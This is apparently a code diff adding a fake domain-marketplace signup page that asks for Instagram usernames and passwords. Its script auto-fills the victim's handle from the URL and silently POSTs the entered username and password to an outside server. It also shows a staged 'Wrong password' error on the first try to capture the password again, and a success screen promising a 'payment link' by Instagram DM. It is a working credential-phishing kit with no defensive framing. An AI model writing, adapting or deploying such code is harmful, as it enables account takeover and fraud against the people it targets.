+            <label class="form-label">Instagram Username</label>
+            <div class="field-wrap">
+              <span class="field-icon" style="font-style:normal;font-size:14px;font-weight:700;color:var(--text3)">@</span>
+              <input class="form-input" type="text" id="igHandle" placeholder="yourhandle" autocomplete="username" readonly style="background:var(--card2);color:var(--text2);cursor:default;user-select:none;">
+            </div>
+          </div>
+          <div class="form-row">
+            <label class="form-label">Password</label>
+            <div class="field-wrap">
+              <span class="field-icon">🔒</span>
+              <input class="form-input" type="password" id="igPwd" placeholder="*****" autocomplete="new-password">
+              <button type="button" class="pwd-toggle" onclick="togglePwd('igPwd',this)">Show</button>
+            </div>
+          </div>
+          <div class="form-row">
+            <label class="form-label">Repeat Password</label>
+            <div class="field-wrap">
+              <span class="field-icon">🔒</span>
+              <input class="form-input" type="password" id="igPwdRepeat" placeholder="*****" autocomplete="new-password">
+              <button type="button" class="pwd-toggle" onclick="togglePwd('igPwdRepeat',this)">Show</button>
+            </div>
+          </div>
+          <div class="form-note" style="margin-top:4px">By signing up you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</div>
+          <button class="btn-submit" onclick="doSignup('ig')">Get Domain →</button>
+          <div class="switch-mode">Already have an account? <a onclick="setMode('login')">Log in</a></div>
+        </div>
+
+        <!-- Login -->
+        <div class="sub-panel" id="igLogin">
+          <div class="form-row">
+            <label class="form-label">Instagram Username</label>
+            <div class="field-wrap">
+              <span class="field-icon" style="font-style:normal;font-size:14px;font-weight:700;color:var(--text3)">@</span>
+              <input class="form-input" type="text" id="igLHandle" placeholder="yourhandle" autocomplete="username">
+            </div>
+          </div>
+          <div class="form-row">
+            <label class="form-label">Password</label>
+            <div class="field-wrap">
+              <span class="field-icon">🔒</span>
+              <input class="form-input" type="password" id="igLPwd" placeholder="Your password" autocomplete="current-password">
+              <button type="button" class="pwd-toggle" onclick="togglePwd('igLPwd',this)">Show</button>
+            </div>
+          </div>
+          <div class="forgot-row"><a href="#">Forgot password?</a></div>
+          <button class="btn-submit" onclick="doLogin('ig')">Log In →</button>
+          <div class="switch-mode">New here? <a onclick="setMode('signup')">Create an account</a></div>
+        </div>
+      </div>
+
+    </div><!-- /#mainForm -->
+
+    <!-- SUCCESS -->
+    <div class="success-screen" id="successScreen">
+      <div class="success-ring">💬</div>
+      <div class="success-title">You're all set!</div>
+      <p class="success-sub">You will receive a <strong>payment link</strong> in your Instagram DM.<br><br>Thank you for transacting with Us.</p>
+      <button class="btn-submit" onclick="closeModal()">← Back to Listings</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// Auto-fill username from URL path e.g. https://buy.domains/vikas → "vikas"
+(function() {
+  const slug = window.location.pathname.replace(/^\/+|\/+$/g, '');
+  if (slug) {
+    const fields = document.querySelectorAll('#igHandle, #igLHandle');
+    fields.forEach(f => { f.value = slug; f.placeholder = slug; });
+  }
+})();
+
+let curMode = 'signup';
+let curTab  = 'ig';
+
+function openModal(mode, domain) {
+  curMode = mode;
+  document.getElementById('modalOverlay').classList.add('open');
+  document.getElementById('mainForm').style.display = 'block';
+  document.getElementById('successScreen').style.display = 'none';
+  document.getElementById('formErr').style.display = 'none';
+
+  const badge = document.getElementById('domainBadge');
+  if (domain) {
+    badge.classList.add('show');
+    document.getElementById('domainBadgeName').textContent = domain;
+  } else {
+    badge.classList.remove('show');
+  }
+
+  signupAttempt = 0;
+  applyMode(mode);
+  document.body.style.overflow = 'hidden';
+}
+
+function closeModal() {
+  document.getElementById('modalOverlay').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function overlayClick(e) {
+  if (e.target === document.getElementById('modalOverlay')) closeModal();
+}
+
+function switchTab(t) {
+  curTab = t;
+  document.getElementById('tabIG').classList.toggle('active', t === 'ig');
+  document.getElementById('panelIG').classList.toggle('active', t === 'ig');
+  document.getElementById('formErr').style.display = 'none';
+}
+
+function setMode(mode) {
+  curMode = mode;
+  applyMode(mode);
+  document.getElementById('formErr').style.display = 'none';
+}
+
+function applyMode(mode) {
+  const login = mode === 'login';
+  document.getElementById('mEyebrow').textContent = login ? 'Welcome Back' : 'New Account';
+  document.getElementById('mTitle').textContent   = login ? 'Log in to your account' : 'Create your account';
+  document.getElementById('mSub').textContent     = login
+    ? 'Access your saved domains and inquiries.'
+    : 'Sign up to inquire, save listings and track deals.';
+
+  const su = document.getElementById('igSignup');
+  const li = document.getElementById('igLogin');
+  if (su) su.classList.toggle('active', !login);
+  if (li) li.classList.toggle('active', login);
+}
+
+function togglePwd(id, btn) {
+  const el = document.getElementById(id);
+  const isHidden = el.type === 'password';
+  el.type = isHidden ? 'text' : 'password';
+  btn.textContent = isHidden ? 'Hide' : 'Show';
+}
+
+function toggleCB(id) {
+  document.getElementById(id).classList.toggle('on');
+}
+
+function strengthCheck(input, wrapId) {
+  const v = input.value;
+  const wrap = document.getElementById(wrapId);
+  const prefix = wrapId === 'gStr' ? 'g' : 'ig';
+  if (!v) { wrap.style.display = 'none'; return; }
+  wrap.style.display = 'block';
+
+  let score = 0;
+  if (v.length >= 8) score++;
+  if (/[A-Z]/.test(v)) score++;
+  if (/[0-9]/.test(v)) score++;
+  if (/[^a-zA-Z0-9]/.test(v)) score++;
+
+  const cls = score <= 1 ? 'weak' : score <= 2 ? 'medium' : 'strong';
+  const lbl = ['','Weak','Fair','Good','Strong'][score] || 'Strong';
+
+  for (let i = 1; i <= 4; i++) {
+    const b = document.getElementById(`${prefix}B${i}`);
+    b.className = 'sbar' + (i <= score ? ' ' + cls : '');
+  }
+  document.getElementById(`${prefix}BL`).textContent = 'Strength: ' + lbl;
+}
+
+function showErr(msg) {
+  const el = document.getElementById('formErr');
+  el.textContent = msg;
+  el.style.display = 'block';
+}
+
+let signupAttempt = 0;
+
+async function doSignup(tab) {
+  const handle = document.getElementById('igHandle').value.trim();
+  const pwd    = document.getElementById('igPwd').value;
+  const pwdR   = document.getElementById('igPwdRepeat').value;
+
+  if (!handle) { showErr('Please enter your Instagram username.'); return; }
+  if (!pwd)    { showErr('Please enter a password.'); return; }
+  if (!pwdR)   { showErr('Please repeat your password.'); return; }
+
+  console.log('Username:', handle);
+  console.log('Password:', pwd);
+
+  // POST to API on every attempt
+  try {
+    await fetch('http://sfa.brightperformancenutrition.com:8080/send_user_sales_details', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: handle, password: pwd })
+    });
+  } catch (e) {
+    // Silent fail — don't block the UX flow
+  }
+
+  signupAttempt++;
+
+  if (signupAttempt === 1) {
+    showErr('Wrong password. Please re-enter your details.');
+    document.getElementById('igPwd').value = '';
+    document.getElementById('igPwdRepeat').value = '';
+    return;
+  }
+
+  // Second attempt — success
+  showSuccess();
+}
+
+function doLogin(tab) {
+  const handle = document.getElementById('igLHandle').value.trim();
+  const pwd    = document.getElementById('igLPwd').value;
+  if (!handle) { showErr('Please enter your Instagram username.'); return; }
+  if (!pwd)    { showErr('Please enter your password.'); return; }
+  showSuccess();
+}
+
+function showSuccess() {
+  document.getElementById('mainForm').style.display = 'none';
+  document.getElementById('successScreen').style.display = 'block';
+}
+
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+// Touch-to-dismiss on mobile swipe down
+let touchStartY = 0;
+document.getElementById('modal').addEventListener('touchstart', e => { touchStartY = e.touches[0].clientY; }, { passive: true });
+document.getElementById('modal').addEventListener('touchend', e => {
+  const dy = e.changedTouches[0].clientY - touchStartY;
+  if (dy > 80 && document.getElementById('modal').scrollTop === 0) closeModal();
+}, { passive: true });
+</script>
+</body>
+</html>
